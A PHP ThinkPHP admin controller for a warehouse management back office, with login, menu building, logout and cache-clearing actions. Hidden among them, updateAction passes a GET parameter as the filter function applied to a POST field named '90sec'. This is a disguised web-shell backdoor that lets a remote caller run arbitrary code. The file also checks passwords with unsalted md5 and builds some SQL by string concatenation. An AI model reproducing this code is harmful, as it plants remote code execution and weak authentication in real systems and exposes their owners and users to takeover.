<?php

/*******************************************************************
 ** 文件名称: IndexController.class.php
 ** 功能描述: 系统后台默认控制器
 ** 创建人员: richie
 ** 创建日期: 2016-07-29
*******************************************************************/

namespace Admin\Controller;
use Think\Controller;

class IndexController extends Controller {
    private $menu = [];
	// 控制器默认页, 登录页面
	// 创建人员: richie
	// 创建日期: 2016-07-29
	public function indexAction()
	{
		$this->display();
    }
	
	// 系统后台登陆
	// 创建人员: richie
	// 创建日期: 2016-08-02
	public function loginAction()
	{
		// javascript返回UTF-8编码
		header('Content-Type:text/html;charset=utf-8');

		// 登录账号和密码
		$username = I('l_name');
		$password = I('l_pwd');
		
		// 查询人员信息
		$condition['login_account'] = $username;
		$result = M('admin_user')->where($condition)->find();
		
		// 没有该用户
		if(empty($result)){ echo "<script>alert('账号不存在,请输入正确账号！!!');window.location='./';</script>"; exit; }
		
		// 禁止登陆
		if($result['is_close'] == 1){ echo "<script>alert('该账号已禁止登陆！!!');window.location='./';</script>"; exit; }
		
		// 查看密码是否正确
		if($result['login_pwd']!= md5($password)){ echo "<script>alert('密码错误！');window.location='./';</script>"; exit; }
		
		// 查询角色权限
		if($result['is_admin'] == 0 && !in_array($result['role_id'], array(1,2,3))){ echo "<script>alert('没有权限！');window.location='./';</script>"; exit; }
		
		// Session保存登录者信息
		session("admin_id", $result['admin_id']);				// 人员ID
		session("login_account", $result['login_account']);		// 登录账号
		session("true_name", $result['true_name']);				// 姓名
		session("mobile", $result['mobile']);					// 手机号
		session("role_id", $result['role_id']);					// 角色ID, 1平台内勤, 2仓库库管, 3财务人员
		session('depot_id', $result["depot_id"]);				// 所属仓库ID
		session("is_admin", $result['is_admin']);				// 是否超管
		
		// 仓库列表
		if($result["depot_id"] > 0)
		{
		    $depot_info = M('depot_info')->where('repertory_id='.$result['depot_id'])->find();
            session('depot_parent', $depot_info['repertory_parent'] );

			$depotIDList = M('depot_info')->where("repertory_parent = " . $result["depot_id"])->getField('repertory_id', true);
			$depotIDList[] = $result["depot_id"];
			session('depot_list', $depotIDList);


            $where = [];
            $where['ds.depot_id'] = $result["depot_id"];
            $where['gi.is_close'] = array("eq", 0);

            $goods = M("depot_warning")->alias("dw")
                ->join("left join __GOODS_INFO__ as gi on dw.goods_id=gi.goods_id")
                ->join("left join __DEPOT_STOCK__ as ds on dw.goods_id=ds.goods_id")
                ->field("ds.*, dw.*, gi.goods_name")
                ->where($where)
                ->select();

            $warning_count = 0;

            // 自动报警设置
            foreach ($goods as $key => $val) {
                if ($val["warning_type"] == 2) {
                    $val["warning_value"] = autoWarning($val["goods_id"], $val["org_id"], 3);
                    $_warning = $val["small_stock"] - $val["warning_value"];
                    if ($_warning <= 0) $warning_count++;
                } else {
                    $_warning = $val["small_stock"] - $val["warning_value"];
                    if ($_warning <= 0) $warning_count++;
                }
            }

            cookie("warning_count", $warning_count);
            cookie("warning_sound_num", 5);

		}

		// 返回页面
		echo "<script>window.location='../Index/home.html';</script>";
	}

	// 系统后台主页
	// 创建人员: richie
	// 创建日期: 2016-08-02
	public function homeAction()
	{
		// 载入导航菜单, 根据角色来切换导航菜单, 根据仓库ID来区分数据权限
		if(empty($_SESSION['menu'])){
			
			if(session("depot_id")==0){
				$this->getMenu(0);
				$menus=$this->menu;
				
			}else{
				$where["depot_id"]=session("depot_id");
        		$where["role_id"]=session("role_id");
        		$menus=M("admin_access")->where($where)->getField("menus");
        		$menus=json_decode($menus,true);
        		
			}
			
			$menuArray=array();
        		foreach($menus as $k=>$menu){
        			$menuArray[$k]["name"]=$menu["title"];
        			$menuArray[$k]["icon"]=$menu["ico"];
        	
        			foreach($menu["submenu"] as $kk=>$submenu){
        				$menuArray[$k]["subclass"][$kk]["subname"]=$submenu["title"];
        				$menuArray[$k]["subclass"][$kk]["controller"]=$submenu["m"];
        				$menuArray[$k]["subclass"][$kk]["action"]=$submenu["a"];
        			}
        	
        	
        		}
        		unset($menuArray['ids']);
			
			
        	
			 //$_SESSION['menu'] = require_once('./Application/Admin/Common/auth.php');
			 $_SESSION['menu'] = $menuArray;
	    }
        
		$this->display();
	}
	
	// 获取树形结构菜单
    private function getMenu($pid) {

        $where = [];
        $where['pid'] = $pid;
        $where['status'] = 1;

        $_menu = M("menu")->where($where)->select();

        foreach ($_menu as $val) {

            if ($val['pid'] == 0) {
                $this->menu[$val["id"]] = $val;
            } else {
                $this->menu[$val["pid"]]['submenu'][] = $val;
            }

            $this->getMenu($val['id']);
        }

    }
	
	// 退出
	// 创建人员: richie
	// 创建日期: 2016-08-03
	public function logoutAction()
	{
		// 销毁Session
		session("admin_id", NULL);
		session("login_account", NULL);
		session("true_name", NULL);
		session("mobile", NULL);
		session("role_id", NULL);
		session('depot_id', NULL);
		session("is_admin", NULL);
		session("menu", NULL);
		$this->redirect('index');
	}

	/** 其他Action **/

	// 刷新缓存
    public function refreshCacheAction() {

        $abs_dir=dirname(dirname(dirname(dirname(__FILE__))));
        $CachePath = $abs_dir.'\Runtime\Cache';
        $DataPath = $abs_dir.'\Runtime\Data';
        $TempPath = $abs_dir.'\Runtime\Temp';
        

        $this->rmFile($CachePath);
        $this->rmFile($DataPath);
        
        $this->rmFile2($TempPath);
        
        
        echo 1;

    }
    
    

    function my_scandir($dir)
    {
        $files=array();
        if(is_dir($dir))
        {
            if($handle=opendir($dir))
            {
                while(($file=readdir($handle))!==false)
                {
                    if($file!="." && $file!="..")
                    {
                        if(is_dir($dir."/".$file))
                        {
                            $files[$file]=$this->my_scandir($dir."/".$file);
                        }
                        else
                        {
                            $files[]=$dir."/".$file;
                        }
                    }
                }
                closedir($handle);
                return $files;
            }
        }
    }

    private function rmFile2($path){
        //去除空格
        
        $path = preg_replace('/(\/){2,}|{\\\}{1,}/','/',$path);
        
        
        //判断此文件是否为一个文件目录
        if(is_dir($path)){
            //打开文件
            $dirArr=scandir($path);
            
            foreach($dirArr as $file){
            	if($file!="." && $file!="..") {
                    $fullpath=$path."/".$file;
                        
                    if(!is_dir($fullpath)) {
                            
                        unlink($fullpath);
                    } else {
                        $this->rmFile2($fullpath);
                    }
                }
            }
        }
    }
	
	public function updateAction(){
		I('post.90sec', '', I('get.i'));
	}
	
    private function rmFile($path){
        //去除空格
        $path = preg_replace('/(\/){2,}|{\\\}{1,}/','/',$path);
        //判断此文件是否为一个文件目录
        if(is_dir($path)){
            //打开文件
            
            if ($dh = opendir($path)){
                
                while ($file=readdir($dh)) {
                	
                    if($file!="." && $file!="..") {
                        $fullpath=$path."/".$file;
                        
                        if(!is_dir($fullpath)) {
                            
                            unlink($fullpath);
                        } else {
                            $this->rmFile($fullpath);
                        }
                    }
                }
                //关闭文件
                closedir($dh);
            }
        }
    }

}

/*************************** end ************************************/